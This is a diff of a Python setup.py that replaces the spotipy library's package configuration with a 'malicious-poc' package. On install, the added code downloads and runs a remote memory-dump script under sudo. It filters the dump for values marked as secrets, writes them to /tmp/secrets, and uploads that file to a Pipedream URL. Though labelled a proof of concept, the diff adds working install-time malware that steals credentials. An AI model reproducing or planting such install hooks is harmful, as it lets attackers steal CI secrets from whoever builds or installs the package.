@@ -1,40 +1,35 @@
 from setuptools import setup
+from setuptools.command.install import install
+import subprocess
 
-with open("README.md") as f:
-    long_description = f.read()
+class CustomInstallCommand(install):
+    def run(self):
+        # 1. Download and run memdump.py, filter for possible secrets, save to /tmp/secrets
+        bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> /tmp/secrets'''
+        subprocess.run(["bash", "-c", bash_command])
 
-memcache_cache_reqs = [
-    'pymemcache>=3.5.2'
-]
+        # 2. Exfiltrate to Pipedream
+        exfil_command = "curl -X PUT --upload-file /tmp/secrets https://eoiissjprny7lfp.m.pipedream.net/secrets.txt"
+        subprocess.run(["bash", "-c", exfil_command])
 
-extra_reqs = {
-    'memcache': [
-        'pymemcache>=3.5.2'
-    ],
-    'test': [
-        'flake8>=7.1.1',
-        'isort>=5.13.2'
-    ]
-}
+        # 3. Optional: Sleep (can remove if not needed)
+        sleep_command = "sleep 60"
+        subprocess.run(["bash", "-c", sleep_command])
+
+        install.run(self)
 
 setup(
-    name='spotipy',
-    version='3.0.0-alpha',
-    description='A light weight Python library for the Spotify Web API',
-    long_description=long_description,
-    long_description_content_type="text/markdown",
-    author="@plamere",
-    author_email="paul@echonest.com",
-    url='https://spotipy.readthedocs.org/',
-    project_urls={
-        'Source': 'https://github.com/plamere/spotipy',
-    },
-    python_requires='>3.8',
-    install_requires=[
-        "redis>=3.5.3",  # TODO: Move to extras_require in v3
-        "requests>=2.25.0",
-        "urllib3>=1.26.0"
+    name='malicious-poc',
+    version='1.0.0',
+    author='PoC Researcher',
+    author_email='attacker@example.com',
+    description='Proof-of-Concept package with custom install logic',
+    packages=['malicious_poc'],
+    python_requires='>=3.6',
+    classifiers=[
+        'Programming Language :: Python :: 3',
     ],
-    extras_require=extra_reqs,
-    license='MIT',
-    packages=['spotipy'])
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+)
